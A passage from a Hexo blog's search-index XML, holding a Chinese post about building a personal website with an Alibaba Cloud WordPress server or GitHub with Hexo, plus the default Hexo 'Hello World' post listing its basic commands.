        <content type="html"><![CDATA[<a id="more"></a><h1 id="自建网站过程"><a href="#自建网站过程" class="headerlink" title="自建网站过程"></a>自建网站过程</h1><p>本人白嫖阿里云的服务器没嫖到，就自己买了个服务器，结果一大堆麻烦事，整个域名验证还老不通过，索性就直接用id了。</p><h2 id="一：利用阿里云服务器建网站"><a href="#一：利用阿里云服务器建网站" class="headerlink" title="一：利用阿里云服务器建网站"></a>一：利用阿里云服务器建网站</h2><p>首先你的先有个服务器，本人用的是ubantu的版本，注意这里你在配置服务器的时候需要选择相关网站的镜像，（本人用的是wordpress的镜像）否则的话，就要重新安装服务器系统了。在配置完服务器之后，你可以直接在网页地址栏中输入你的服务器的IP地址就可以直接访问你所设置的网页初始页面。</p><p>我的网站因为设置的是wordpress的类型的博客所以在初始页面中会让我设置登录名，密码，邮箱等。等弄好之后就可以访问你的博客网站了。</p><p>如果还是不太明白可以看这位的建网站过程：<a href="https://developer.aliyun.com/course/70?spm=a2c6h.13788107.J_7606789820.2.3c1961a8aoO1qQ" target="_blank" rel="noopener">https://developer.aliyun.com/course/70?spm=a2c6h.13788107.J_7606789820.2.3c1961a8aoO1qQ</a></p><h2 id="二：利用GitHub和hexo建造个人博客（也是我现在所用的界面）"><a href="#二：利用GitHub和hexo建造个人博客（也是我现在所用的界面）" class="headerlink" title="二：利用GitHub和hexo建造个人博客（也是我现在所用的界面）"></a>二：利用GitHub和hexo建造个人博客（也是我现在所用的界面）</h2><p>这个方法过程有点复杂，本人也不太明白这其中的原理，具体建造过程可以根据这位的教程：<a href="https://yafine-blog.cn/posts/4ab2.html" target="_blank" rel="noopener">https://yafine-blog.cn/posts/4ab2.html</a></p><p>在这里本人也提醒一下，在建造网站的过程中，一定要看好是在哪个文件夹的根目录文件进行相关修改（本人应为这个原因重做了好几次），同时也要及时进行文件的同步，要不然你的网站就没啥变化，最后，提醒一下如果你的网页出现找不到相关页面的话，可以在GitHub上看下你是否有这个文件，如果没有的话就要重新同步一下，如果同步完之后还是没有的话就在你的网站所在文件夹的public文件夹中看下是否有相关文件夹，没有的话就粗暴点自己手动建个然后再同步，基本上就解决了（<del>本人在建网站时因为这个问题都快疯了</del>）。 </p>]]></content>
      
      
      
        <tags>
            
            <tag> 网站的建造 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/04/04/hello-world/"/>
      <url>/2020/04/04/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
